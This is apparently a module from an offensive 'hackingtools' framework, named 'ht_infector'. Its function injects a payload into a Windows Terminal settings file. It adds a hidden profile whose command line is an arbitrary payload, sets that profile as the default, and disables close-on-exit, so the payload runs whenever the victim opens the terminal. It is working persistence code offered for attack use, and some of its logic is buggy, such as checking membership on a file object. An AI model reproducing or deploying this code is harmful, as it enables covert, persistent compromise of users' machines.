from hackingtools.core import Logger, Utils, Config
import hackingtools as ht
import os, json

config = Config.getConfig(parentKey='modules', key='ht_infector')
output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))

class StartModule():

	def __init__(self):
		pass

	def help(self):
		Logger.printMessage(message=ht.getFunctionsNamesFromModule('ht_infector'), debug_module=True)

	def injectPayloadToWindowsTerminalProfile(self, payload, filename, update=False):
		default_id = '{b423ar62-7e1d-5e34-b456-77938ec441ba}'
		config = {}
		if os.path.isfile(filename):
			with open(filename, 'r') as file_data:
				if default_id in file_data  and not update:
					return Logger.print_and_return('Already exists', 'Not injecting')
				data = ''
				for line in file_data:
					if not '//' in line:
						data = '{d}{dd}'.format(d=data, dd=line.replace('\n', '').replace('\t', '').strip())
				if data:
					try:
						config = json.loads(data)
					except Exception as e:
						try:
							config = json.dumps(file_data, indent=2)
							print(config)
							config = json.load(file_data)
							print(config)
						except:
							raise
				else:
					try:
						config = json.dumps(file_data, indent=2)
						print(config)
						config = json.load(file_data)
						print(config)
					except:
						raise

			my_payload = {}
			my_payload['guid'] = default_id
			my_payload['hidden'] = True
			my_payload['name'] = 'Linux Should Not be Here'
			my_payload['commandLine'] = payload

			if update:
				for ind_prof, profile in enumerate(config["profiles"]):
					if config["profiles"][ind_prof]['guid'] == default_id:
						del config["profiles"][ind_prof]
			config["profiles"].append(my_payload)
			config["defaultProfile"] = default_id
			config["closeOnExit"] = False

			with open(filename, 'w', encoding='utf8') as outfile:  
				json.dump(config, outfile, indent=2, ensure_ascii=False)